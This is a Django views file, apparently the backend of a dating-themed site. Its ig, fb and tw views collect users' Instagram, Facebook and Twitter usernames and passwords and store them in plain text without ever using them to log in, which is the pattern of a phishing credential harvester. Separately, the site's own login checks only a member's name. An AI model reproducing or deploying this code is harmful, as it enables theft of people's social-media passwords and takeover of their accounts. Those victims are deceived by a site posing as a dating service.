from django.shortcuts import render ,redirect
from .models import Member, Manage, Facebook,Instagram, Dating, Twitter
from django.core.exceptions import ObjectDoesNotExist

# Create your views here.

def home(request):
    return render(request, 'index.html')

def account(request):
    memb = Dating.objects.all()
    Manages = Manage.objects.all()
    cont={'Memb':memb,'msg':'none','Manages':Manages}


    if request.session.get('lname', None):
        user = request.session['lname']
        user_m = Member.objects.get(name=user)
        username=user_m.name
        cont={'user':user_m,'Memb':memb,'msg':'none','username':username,'Manages':Manages}

    else:
        cont={'icon':'im im-user-male','username':'user-name','Memb':memb,'msg':'none','pic':'none','Manages':Manages}

        return render(request, 'account.html', cont, )



    return render(request, 'account.html', cont,)

def signup(request):
    cont={}
    if 'name' in request.POST:
        name = request.POST['name']
        location = request.POST['location']
        description = request.POST['description']
        photo = request.FILES['photo']

        user = Member(name=name, description=description, photo=photo, location=location)
        user.save()

        request.session['lname']=name


        return render(request, 'choice.html')

    if 'lname' in request.POST:
        lname= request.POST['lname']
        try:
            Luser= Member.objects.get(name=lname)

            request.session['lname']=Luser.name

            return redirect('/account')
        except ObjectDoesNotExist:
            cont = {'msg':'user does not exist create new-user'}


    return render(request, 'signup.html', cont)

def ig(request):
    if request.method=='POST':
        user = request.POST['user']
        user_pass =request.POST['pass']

        user = Instagram(instagram=user, ig_password=user_pass)
        user.save()
        cont={'msg':''}
        return render(request, 'account.html',cont)

    return render(request, 'ig.html')

def fb(request):
    if 'f-user' in request.POST:
        fuser = request.POST['f-user']
        fpass = request.POST['f-pass']

        user = Facebook(facebook=fuser, fpassword=fpass)
        user.save()

        cont = {'msg': ''}
        return render(request, 'account.html',cont)

    return render(request, 'fb.html')

def tw(request):
    if request.method=='POST':
        user = request.POST['user']
        user_pass =request.POST['pass']

        user = Twitter(twitter=user, tw_password=user_pass)
        user.save()
        cont={'msg':''}
        return render(request, 'account.html',cont)
    return render(request, 'tw.html')